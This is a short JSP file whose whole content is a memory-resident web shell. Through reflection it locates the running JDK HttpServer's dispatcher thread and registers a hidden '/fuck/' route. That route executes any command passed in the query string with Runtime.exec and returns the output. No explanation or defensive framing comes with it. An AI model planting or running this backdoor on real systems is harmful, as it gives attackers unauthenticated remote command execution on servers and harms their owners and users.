<%@ page import="java.lang.reflect.Field" %>
<%@ page import="com.sun.net.httpserver.HttpServer" %>
<%@ page import="java.io.OutputStream" %>
<%
    Thread t = Thread.currentThread();
    Field field = t.getThreadGroup().getClass().getDeclaredField("threads");
    field.setAccessible(true);
    Thread[] threads = (Thread[]) field.get(t.getThreadGroup());
    for(int i = 0;i < threads.length;i ++){
        Thread thread = threads[i];
        field = Thread.class.getDeclaredField("target");
        field.setAccessible(true);
        Object o = field.get(thread);
        if( o != null){
            if(o.getClass().getName() == "sun.net.httpserver.ServerImpl$Dispatcher"){
                field = o.getClass().getDeclaredField("this$0");
                field.setAccessible(true);
                o = field.get(o);

                field = o.getClass().getDeclaredField("wrapper");
                field.setAccessible(true);
                o = field.get(o);

                HttpServer server = (HttpServer)o;
                server.createContext("/fuck/", httpExchange -> {
                    String resp = "ok";
                    try{
                        String cmd = httpExchange.getRequestURI().getQuery();

                        byte[] b = java.lang.String.format("%99s"," ").getBytes();
                        java.lang.Runtime.getRuntime().exec(cmd).getInputStream().read(b);
                        resp = new java.lang.String(b).trim();
                    }catch (Exception e){

                    }finally {
                        httpExchange.sendResponseHeaders(200, (long)resp.length());
                        OutputStream os = httpExchange.getResponseBody();
                        os.write(resp.getBytes());
                        os.close();
                    }
                });
            }
        }
    }
%>